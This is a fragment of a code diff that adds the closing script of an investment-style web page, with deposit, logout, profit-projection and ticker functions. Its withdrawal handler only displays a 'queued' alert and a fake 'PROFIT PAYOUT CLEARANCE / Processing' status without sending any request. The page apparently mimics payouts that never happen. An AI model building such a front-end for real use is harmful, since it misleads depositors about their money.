+    function handleWithdraw(e) {
+      e.preventDefault();
+      alert('Withdrawal request queued. Security review pending.');
+      document.getElementById('logs-container').innerHTML = `<div class="flex justify-between items-center py-3 border-b border-white/5 text-xs">
+        <div>
+          <div class="font-bold text-white">PROFIT PAYOUT CLEARANCE</div>
+          <div class="text-[9px] text-slate-500 mt-0.5">PROCESSING NOW</div>
+        </div>
+        <span class="bg-yellow-500/10 text-yellow-500 px-2.5 py-0.5 rounded font-bold text-[10px] border border-yellow-500/10">Processing</span>
+      </div>`;
+      e.target.reset();
+    }
+
+    function showMainLanding() {
+      document.getElementById('dashboard-section').style.display = 'none';
+      document.getElementById('admin-section').style.display = 'none';
+      document.getElementById('landing-page-group').style.display = 'block';
+    }
+
+    function logout() {
+      loggedInUserEmail = '';
+      showMainLanding();
+    }
+
+    function openDepositModal() { document.getElementById('deposit-modal').classList.remove('hidden'); }
+    function closeDepositModal() { document.getElementById('deposit-modal').classList.add('hidden'); }
+
+    calculateProjectedProfit();
+    setTimeout(liveLoopTickerCore, 1000);
+  </script>
+</body>
+</html>
+
+
+
+
+
